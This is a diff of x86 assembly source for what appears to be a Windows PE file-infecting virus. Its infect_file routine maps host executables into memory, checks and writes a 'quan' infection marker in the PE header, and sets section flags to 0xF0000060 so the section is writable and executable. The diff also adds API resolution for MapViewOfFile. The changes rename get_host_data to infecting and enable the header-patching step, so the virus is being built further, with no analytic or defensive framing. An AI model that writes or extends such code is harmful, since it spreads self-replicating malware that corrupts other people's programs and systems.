@@ -159,8 +159,7 @@ infect_file:
     	call map_into_mem
     	cmp eax,0
     	je map_into_mem_fail
-    
-    	call get_host_data
+    	call infecting
 map_into_mem_fail:
     	call unmap_into_mem
 create_file_mapping_fail:
@@ -168,7 +167,7 @@ create_file_mapping_fail:
 open_fail:
    	call uncreate_file_handle
   	ret
-get_host_data:
+infecting:
 	xor eax,eax
 	xor ebx,ebx
 	xor ecx,ecx
@@ -178,11 +177,11 @@ get_host_data:
 	add eax,3ch
 	mov ecx,[eax]
 	add ecx,[ebp+mem_map_handle]
-	add eax,ecx    ; point to PE header of host
+	mov eax,ecx    ; point to PE header of host
 	add eax,18h
 	add eax,52	   ; point to reverse bit (infection mark)
 	
-	cmp dword ptr[eax],'quan'
+	cmp dword ptr[eax],"nauq"
 	je file_not_infect
 	
 	mov eax,ecx
@@ -253,10 +252,10 @@ get_host_data:
 	add eax,18h
 	add eax,52
 	
-	mov dword ptr[eax],'quan'
+	mov dword ptr[eax],"quan"
 	mov eax,[ebp+host_rel_tab]
 	add eax,24
-	;mov dword ptr[eax],0xF0000060;F0000060h
+	mov dword ptr[eax],0F0000060H
 	
 	mov eax,ecx
 	add eax,18h
@@ -506,8 +505,13 @@ find_APIAddress:
 	push dword ptr [ebp+handle]
 	call [ebp+GetProcAddressAddress]
 	mov [ebp+SetCurrentDirectoryAddress],eax 
-	ret	
-
+	
+	lea eax,[ebp+ offset MapViewOfFileStr]
+	push eax
+	push dword ptr [ebp+handle]
+	call [ebp+GetProcAddressAddress]
+	mov [ebp+MapViewOfFileAAddress],eax
+	ret
 end_objecttable: 
 	
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
